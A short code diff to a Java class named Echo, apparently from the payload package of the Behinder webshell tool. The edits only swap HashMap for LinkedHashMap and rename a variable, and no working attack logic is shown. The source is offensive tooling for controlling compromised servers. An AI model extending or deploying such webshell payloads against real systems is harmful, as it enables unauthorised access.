@@ -1,8 +1,8 @@
 package net.rebeyond.behinder.payload.java;
 
 import java.lang.reflect.Method;
-import java.util.HashMap;
 import java.util.Iterator;
+import java.util.LinkedHashMap;
 import java.util.Map;
 import java.util.Random;
 import javax.crypto.Cipher;
@@ -16,7 +16,7 @@ public class Echo {
    private Object Session;
 
    public boolean equals(Object obj) {
-      HashMap result = new HashMap();
+      LinkedHashMap result = new LinkedHashMap();
       boolean var13 = false;
 
       Object so;
@@ -124,7 +124,7 @@ public class Echo {
 
    private String base64encode(byte[] data) throws Exception {
       String result = "";
-      String version = System.getProperty("java.version");
+      String var4 = System.getProperty("java.version");
 
       Class Base64;
       try {
